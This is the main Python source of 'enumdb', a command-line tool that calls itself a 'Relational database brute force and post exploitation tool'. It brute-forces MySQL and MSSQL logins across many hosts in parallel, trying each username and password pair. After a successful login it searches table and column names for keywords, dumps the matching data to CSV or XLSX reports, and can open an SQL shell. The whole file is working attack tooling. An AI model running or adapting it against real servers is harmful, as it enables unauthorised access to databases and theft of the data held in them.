import argparse
from sys import exit
from time import sleep
from getpass import getpass
from os import path, remove
from ipparser import ipparser
from threading import Thread, activeCount
from datetime import datetime

from enumdb.config import *
from enumdb.printers import *
from enumdb.shell import DBShell
from enumdb.xlsx import CreateXLSX
from enumdb.db_support.mysql import MySQL
from enumdb.db_support.mssql import MSSQL

##########################################
# DB module classes found in db_support dir
##########################################
DB = {'mysql' : {'Port' : 3306,
                 'Class': MySQL()},
     'mssql'  : {'Port' : 1433,
                'Class': MSSQL()},
    }

class enum_db:
    def __init__(self):
        # Used to init xlsx report
        self.table_count = 0

    def db_main(self, args, target):
        # Setup output file
        outfile = get_outfile(args.report, target)
        # Create class Object by database type
        class_obj = self.db_obj(args.dbtype)
        # Start brute forcing
        for user in args.users:
            for passwd in args.passwords:
                con = class_obj.connect(target, args.port, user, passwd, args.verbose)
                # Start Enumeration
                if con and not args.brute:
                    self.db_enum(class_obj, args.dbtype, con, outfile, target, args.column_search, args.report, args.verbose)
                if con:
                    con.close()
        if args.report and path.exists(outfile):
            print_closing("Output file created: {}".format(outfile))

    def db_enum(self, db_class, db_type, con, outfile, host, column_search, report, verbose):
        for database in db_class.get_databases(con):
            if database.lower() in DB_BLACKLIST: return
            for table in db_class.get_tables(con, database):
                if table.lower() in TABLE_BLACKLIST: return
                if column_search:
                    self.db_column_search(con, db_type, db_class, outfile, host, database, table, report, verbose)
                else:
                    self.db_table_search(con, db_type, db_class, outfile, host, database, table, report, verbose)

    def db_obj(self, db_type):
        return DB[db_type]['Class']


    def db_reporter(self, report, outfile, host, db_type, table, database, columns, data):
        if report == 'csv':
            write_csv(outfile, columns, data, database, table, host)
        elif report == 'xlsx':
            # Create xlsx workbook on first found data
            if self.table_count == 0:
                self.xlsx = CreateXLSX(outfile, host, db_type)
            self.xlsx.addto_overview(database, table, host)
            self.xlsx.create_sheet(database, table, columns, data, host)
        self.table_count += 1

    def db_table_search(self, con, db_type, db_class, outfile, host, database, table, report, verbose):
        for t in TABLE_KEY_WORDS:
            if t in table.lower():
                # Enum data in database, to check for empty data set
                data = db_class.get_data(con, database, table)
                if data:
                    print_status('Keyword match: {:11} Table: {:42} DB: {:23} SRV: {} ({})'.format(t, table, database, host, db_type))
                    if report:
                        self.db_reporter(report, outfile, host, db_type, table, database, db_class.get_columns(con, database, table), data)
                elif verbose:
                    print_empty('{:26} Table: {:42} DB: {:23} SRV: {} ({})'.format("Empty data set", table, database, host, db_type))
                return

    def db_column_search(self, con, db_type, db_class, outfile, host, database, table, report, verbose):
        columns = db_class.get_columns(con, database, table)
        for col_name in columns:
            for keyword in COLUMN_KEY_WORDS:
                if keyword in col_name.lower():
                    # Enum data in database, to check for empty data set
                    data = db_class.get_data(con, database, table)
                    if data:
                        print_status('Column: {:18} Table: {:42} DB: {:23} SRV: {} ({})'.format(col_name, table, database, host, db_type))
                        if report:
                            self.db_reporter(report, outfile, host, db_type, table, database, db_class.get_columns(con, database, table), data)
                    elif verbose:
                        print_empty('{:26} Table: {:42} DB: {:23} SRV: {} ({})'.format("Empty data set", table, database, host, db_type))
                    return


##########################################
# CSV reporting / output functions
##########################################
def write_csv(outfile, columns, data, database, table, host):
    # After table/ column enumeration, write to csv
    write_file(outfile, "\"[+] Table: {}   Database: {}   Server: {}\"\n".format(table, database, host))
    for col in columns:
        write_file(outfile, "\"{}\",".format(col))
    write_file(outfile, "\n")
    data_count = 0
    while data_count != len(data):
        for y in data[data_count]:
            write_file(outfile, "\"{}\",".format(y))
        data_count += 1
        write_file(outfile, "\n")
    write_file(outfile, "\n\n\n")

def write_file(file, data):
    OpenFile = open(file, 'a')
    OpenFile.write('{}'.format(data))
    OpenFile.close()

def outfile_prep(file):
    # Check if another report exists and overwrite
    if path.exists(file):
        remove(file)
    return file

def get_outfile(report, target):
    # Setup output file, new file for every enumerated target
    if report:
        return outfile_prep("enumdb_{}.{}".format(target, file_ext(report)))
    else:
        return False

def file_ext(report):
    if report == 'csv':
        return 'csv'
    elif report == 'xlsx':
        return 'xlsx'

##########################################
# Argparse support / input validation
##########################################
def default_port(db_type):
    return DB[db_type]['Port']

def file_exists(parser, filename):
    # Used with argparse to check if input files exists
    if not path.exists(filename):
        parser.error("Input file not found: {}".format(filename))
    return [x.strip() for x in open(filename)]

##########################################
# Shell functionality
##########################################
def shell_launcher(args):
    if len(args.target) > 1:
        print_failure("Too many targets provided.")
        exit(1)
    DBShell(DB[args.dbtype]['Class'], args.target[0], args.port, args.users[0], args.passwords[0])

##########################################
# Main
##########################################
def launcher(args):
    try:
        if args.shell:
            print_status("Initiating SQL shell..")
            shell_launcher(args)
        else:
            print_status("Starting enumeration...")
            print_status("Users  : {}".format(len(args.users)))
            print_status("Targets: {}".format(len(args.target)))
            print_status("Time   : {}\n".format(datetime.now().strftime('%m-%d-%Y %H:%M:%S')))
            for t in args.target:
                x = Thread(target=enum_db().db_main, args=(args, t,))
                x.daemon = True
                x.start()
                # Do not exceed max threads
                while activeCount() > args.max_threads:
                    sleep(0.001)
            # Exit all threads before closing
            while activeCount() > 1:
                sleep(0.001)
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected...\n\n")
        exit(0)

def main():
    version = '2.2.0'
    try:
        args = argparse.ArgumentParser(description=("""
                        enumdb   (v{0})
    --------------------------------------------------
  Relational database brute force and post exploitation tool
        """).format(version), formatter_class=argparse.RawTextHelpFormatter, usage=argparse.SUPPRESS)

        args.add_argument('-T', dest='max_threads', type=int, default=10, help='Max threads (Default: 10)')
        args.add_argument('-v', dest="verbose", action='store_true', help="Verbose output")

        con = args.add_argument_group("Connection")
        con.add_argument('-port', dest='port', type=int, default=0, help='Specify non-standard port')
        con.add_argument('-t', dest='dbtype', choices=['mysql', 'mssql'], required=True, help='Database type')
        con.add_argument(dest='target', nargs='+', help='Target database server(s) [Positional]')

        auth = args.add_argument_group("Authentication")
        user = auth.add_mutually_exclusive_group(required=True)
        user.add_argument('-u', dest='users', type=str, action='append', help='Single username')
        user.add_argument('-U', dest='users', default=False, type=lambda x: file_exists(args, x), help='Users.txt file')

        passwd = auth.add_mutually_exclusive_group()
        passwd.add_argument('-p', dest='passwords', action='append', default=[], help='Single password')
        passwd.add_argument('-P', dest='passwords', default=False, type=lambda x: file_exists(args, x), help='Password.txt file')

        enum = args.add_argument_group("Enumeration")
        enum.add_argument('-c', '--columns', dest="column_search", action='store_true', help="Search for key words in column names (Default: table names)")
        enum.add_argument('-r', dest='report', choices=['none', 'csv', 'xlsx'], default='none', help='Extract data and create output report')

        actions = args.add_argument_group("Additional Actions")
        actions.add_argument('--brute', dest="brute", action='store_true', help='Brute force only (No DB Enumeration)')
        actions.add_argument('--shell', dest="shell", action='store_true', help='Launch SQL Shell')
        args = args.parse_args()

        # Put target input into an array
        args.target = ipparser(args.target[0])

        # Get Password if not provided
        if not args.passwords:
            args.passwords = [getpass("Enter password, or continue with null-value: ")]

        # Define default port based on dbtype
        if args.port == 0:
            args.port = default_port(args.dbtype)

        print_status("Enumdb (v{})".format(version))
        launcher(args)
    except KeyboardInterrupt:
        print("\n[!] Key Event Detected...\n\n")
        exit(0)